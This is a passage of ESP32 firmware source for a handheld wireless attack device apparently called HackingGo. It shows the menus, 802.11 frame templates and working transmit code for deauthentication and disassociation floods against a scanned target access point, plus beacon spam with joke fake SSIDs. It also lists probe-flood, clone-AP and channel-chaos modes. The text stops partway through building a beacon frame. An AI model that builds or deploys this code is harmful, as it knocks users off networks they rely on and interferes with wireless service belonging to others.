#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <SPI.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <string.h>
#include <stdlib.h>
#include "HackingGoApp.h"
#include "button.h"

// ============ HARDWARE PINS ============
#define TFT_CS    5
#define TFT_RST   4
#define TFT_DC    2
#define TFT_MOSI  23
#define TFT_SCLK  18

// ============ INPUT PINS ============
#define JOY_X     34
#define JOY_Y     35
#define JOY_BTN   32
#define BTN_ENTER 13
#define BTN_BACK  25

// ============ CONSTANTS & THEME ============
#define MAX_NETWORKS 20
#define SCREEN_W 128
#define SCREEN_H 160

// Attack Duration (milliseconds) - 60 seconds default
#define ATTACK_DURATION_MS 60000

// Cyberpunk Color Palette (RGB565)
#define COLOR_BG        0x0843
#define COLOR_PANEL     0x1084
#define COLOR_TEXT      0xFFFF
#define COLOR_DIM       0x7BEF
#define COLOR_CYAN      0x07FF
#define COLOR_GREEN     0x07E0
#define COLOR_RED       0xF986
#define COLOR_ORANGE    0xFD20
#define COLOR_HIGHLIGHT 0x02EC
#define COLOR_PROGRESS  0x07E0
#define COLOR_PROG_BG   0x2104

// ============ DISPLAY ============
extern Adafruit_ST7735 tft;

// ============ STATE MACHINE ============
enum AppState {
    STATE_MAIN_MENU,
    STATE_WIFI_SCAN,
    STATE_WIFI_LIST,
    STATE_ATTACK_MENU,
    STATE_ATTACK_RUNNING,
    STATE_BLE_FLOOD
};

enum AttackType {
    ATTACK_DEAUTH = 0,
    ATTACK_BEACON_SPAM,
    ATTACK_PROBE_SPAM,
    ATTACK_CLONE_AP,
    ATTACK_CHANNEL_CHAOS,
    ATTACK_TYPE_COUNT
};

static const char* attackNames[] = {
    "Deauth Flood",
    "Beacon Spam",
    "Probe Flood",
    "Clone AP",
    "Channel Chaos"
};

static const char* mainMenuItems[] = {
    "1.WiFi Scanner",
    "2.Beacon Spam",
    "3.Probe Flood",
    "4.BLE Spammer",
    "5.Channel Chaos",
    "6.Exit to Home"
};
#define MAIN_MENU_COUNT 6

// ============ APPLICATION VARIABLES ============
static AppState currentState = STATE_MAIN_MENU;
static AttackType currentAttack = ATTACK_DEAUTH;

static int mainMenuIndex = 0;
static int selectedNetwork = 0;
static int wifiListIndex = 0;
static int wifiListScroll = 0;
static int attackMenuIndex = 0;
static int networkCount = 0;

static bool attackRunning = false;
static unsigned long attackStartTime = 0;
static unsigned long attackDuration = ATTACK_DURATION_MS;
static unsigned long lastPacketTime = 0;
static unsigned long packetCount = 0;
static uint8_t chaosChannel = 1;
static bool bleActive = false;
static BLEAdvertising *pBLEAdvertising = nullptr;
static bool wifiInitialized = false;

static bool joyCentered = true;
static unsigned long lastJoyMoveTime = 0;
static bool needFullRedraw = true;
static uint8_t lastProgressPercent = 255;

// ============ NETWORK DATA ============
struct NetworkInfo {
    char ssid[33];
    uint8_t bssid[6];
    int channel;
    int rssi;
    uint8_t encType;
};

static NetworkInfo networks[MAX_NETWORKS];

// ============ 802.11 PACKET TEMPLATES ============
static uint8_t deauthPacket[26] = {
    0xC0, 0x00,                         // Type/Subtype: Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
    0x00, 0x00,                         // Sequence
    0x07, 0x00                          // Reason: Class 3 frame
};

static uint8_t disassocPacket[26] = {
    0xA0, 0x00,                         // Type/Subtype: Disassoc
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence
    0x08, 0x00                          // Reason
};

static uint8_t probePacket[57] = {
    0x40, 0x00,                         // Type: Probe Request
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (Random)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID: Broadcast
    0x00, 0x00,                         // Sequence
    // Tagged params start at 24
    0x00, 0x00,                         // SSID: Wildcard
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24, // Supported Rates
    0x32, 0x04, 0x30, 0x48, 0x60, 0x6C, // Extended Rates
    0x03, 0x01, 0x01,                   // DS Parameter
    0x2D, 0x1A, 0xEF, 0x11, 0x1B, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // HT Capabilities
};

static const char* fakeSSIDs[] = {
    "Free_WiFi_5G",
    "FBI_Van_#47",
    "NSA_Listening",
    "Virus.exe",
    "Get_Off_My_LAN",
    "PrettyFly4AWifi",
    "Wu_Tang_LAN",
    "Drop_It_Like_AP",
    "The_Promised_LAN",
    "Bill_Wi_The_Sci_Fi",
    "Nacho_WiFi",
    "ItHurtsWhenIP",
    "404_Net_Not_Found",
    "Skynet_Global",
    "TellMyWifiLoveHer",
    "LoadingPlsWait"
};
#define FAKE_SSID_COUNT 16

// ==================================================
// GRAPHICS HELPERS
// ==================================================

static inline void useSimpleFont() {
    tft.setFont(NULL);
    tft.setTextWrap(false);
}

static void drawHeader(const char* title, uint16_t accentColor) {
    useSimpleFont();
    tft.fillRect(0, 0, SCREEN_W, 13, COLOR_PANEL);
    tft.drawFastHLine(0, 13, SCREEN_W, accentColor);
    tft.setCursor(3, 3);
    tft.setTextColor(accentColor, COLOR_PANEL);
    tft.setTextSize(1);
    tft.print(title);
    tft.setCursor(SCREEN_W - 33, 3);
    tft.setTextColor(COLOR_CYAN, COLOR_PANEL);
    tft.print("AUDIT");
}

static void drawFooter(const char* hint) {
    useSimpleFont();
    tft.fillRect(0, SCREEN_H - 12, SCREEN_W, 12, COLOR_PANEL);
    tft.drawFastHLine(0, SCREEN_H - 13, SCREEN_W, COLOR_DIM);
    tft.setCursor(3, SCREEN_H - 10);
    tft.setTextColor(COLOR_DIM, COLOR_PANEL);
    tft.setTextSize(1);
    tft.print(hint);
}

static void drawString(int x, int y, const char* str, uint16_t fg, uint16_t bg, uint8_t size = 1) {
    useSimpleFont();
    tft.setCursor(x, y);
    tft.setTextColor(fg, bg);
    tft.setTextSize(size);
    tft.print(str);
}

static void drawProgressBar(int x, int y, int w, int h, uint8_t percent, uint16_t fgColor, uint16_t bgColor) {
    tft.drawRect(x, y, w, h, COLOR_DIM);
    tft.fillRect(x + 1, y + 1, w - 2, h - 2, bgColor);
    int fillW = ((w - 4) * percent) / 100;
    if (fillW > 0) {
        tft.fillRect(x + 2, y + 2, fillW, h - 4, fgColor);
    }
}

static const char* getEncTypeStr(uint8_t enc) {
    switch (enc) {
        case WIFI_AUTH_OPEN: return "OPEN";
        case WIFI_AUTH_WEP:  return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "ENT";
        case WIFI_AUTH_WPA3_PSK: return "WPA3";
        default: return "SEC";
    }
}

// ==================================================
// RAW WIFI INITIALIZATION - CRITICAL FOR PACKET TX
// ==================================================

static bool initRawWiFi() {
    if (wifiInitialized) return true;
    
    // Completely disable WiFi first
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    
    // Initialize WiFi in STA mode
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    
    if (esp_wifi_init(&cfg) != ESP_OK) {
        return false;
    }
    
    if (esp_wifi_set_storage(WIFI_STORAGE_RAM) != ESP_OK) {
        return false;
    }
    
    if (esp_wifi_set_mode(WIFI_MODE_STA) != ESP_OK) {
        return false;
    }
    
    if (esp_wifi_start() != ESP_OK) {
        return false;
    }
    
    // Set max TX power (78 = 19.5 dBm)
    esp_wifi_set_max_tx_power(78);
    
    // Enable promiscuous mode for raw packet transmission
    if (esp_wifi_set_promiscuous(true) != ESP_OK) {
        return false;
    }
    
    wifiInitialized = true;
    return true;
}

static void deinitRawWiFi() {
    if (wifiInitialized) {
        esp_wifi_set_promiscuous(false);
        esp_wifi_stop();
        esp_wifi_deinit();
        wifiInitialized = false;
    }
}

static void setChannel(uint8_t channel) {
    if (channel < 1) channel = 1;
    if (channel > 14) channel = 14;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

// ==================================================
// OPTIMIZED PACKET TRANSMISSION
// ==================================================

static inline void randomMAC(uint8_t* mac) {
    mac[0] = 0x02; // Locally administered
    mac[1] = random(0, 256);
    mac[2] = random(0, 256);
    mac[3] = random(0, 256);
    mac[4] = random(0, 256);
    mac[5] = random(0, 256);
}

static void IRAM_ATTR transmitDeauthBurst() {
    if (networkCount == 0 || selectedNetwork >= networkCount) return;
    
    NetworkInfo &tgt = networks[selectedNetwork];
    setChannel(tgt.channel);
    
    uint16_t seq = (packetCount & 0x0FFF) << 4;
    
    // Deauth: AP -> Broadcast
    memset(&deauthPacket[4], 0xFF, 6);
    memcpy(&deauthPacket[10], tgt.bssid, 6);
    memcpy(&deauthPacket[16], tgt.bssid, 6);
    deauthPacket[22] = seq & 0xFF;
    deauthPacket[23] = (seq >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    packetCount++;
    
    // Deauth: Client -> AP (random client)
    uint8_t fakeClient[6];
    randomMAC(fakeClient);
    memcpy(&deauthPacket[4], tgt.bssid, 6);
    memcpy(&deauthPacket[10], fakeClient, 6);
    seq = ((packetCount & 0x0FFF) << 4);
    deauthPacket[22] = seq & 0xFF;
    deauthPacket[23] = (seq >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    packetCount++;
    
    // Disassoc: AP -> Broadcast
    memset(&disassocPacket[4], 0xFF, 6);
    memcpy(&disassocPacket[10], tgt.bssid, 6);
    memcpy(&disassocPacket[16], tgt.bssid, 6);
    seq = ((packetCount & 0x0FFF) << 4);
    disassocPacket[22] = seq & 0xFF;
    disassocPacket[23] = (seq >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
    packetCount++;
    
    // Disassoc: Client -> AP
    memcpy(&disassocPacket[4], tgt.bssid, 6);
    randomMAC(fakeClient);
    memcpy(&disassocPacket[10], fakeClient, 6);
    seq = ((packetCount & 0x0FFF) << 4);
    disassocPacket[22] = seq & 0xFF;
    disassocPacket[23] = (seq >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
    packetCount++;
}

static void IRAM_ATTR transmitBeaconFrame(const char* ssid, uint8_t channel) {
    setChannel(channel);
    
    uint8_t packet[128];
    memset(packet, 0, sizeof(packet));
    
    // Header
    packet[0] = 0x80; packet[1] = 0x00; // Beacon
    packet[2] = 0x00; packet[3] = 0x00; // Duration
    memset(&packet[4], 0xFF, 6);        // Destination: Broadcast
    
    // Random source MAC
    packet[10] = 0x02;
    packet[11] = (uint8_t)(packetCount & 0xFF);
    packet[12] = (uint8_t)((packetCount >> 8) & 0xFF);
    packet[13] = channel;
    packet[14] = random(0, 256);
    packet[15] = random(0, 256);
    
    // BSSID = Source
    memcpy(&packet[16], &packet[10], 6);
    
    // Sequence
    uint16_t seq = ((packetCount & 0x0FFF) << 4);
    packet[22] = seq & 0xFF;
    packet[23] = (seq >> 8) & 0xFF;
    
    // Fixed parameters (8 bytes timestamp + 2 beacon interval + 2 capability)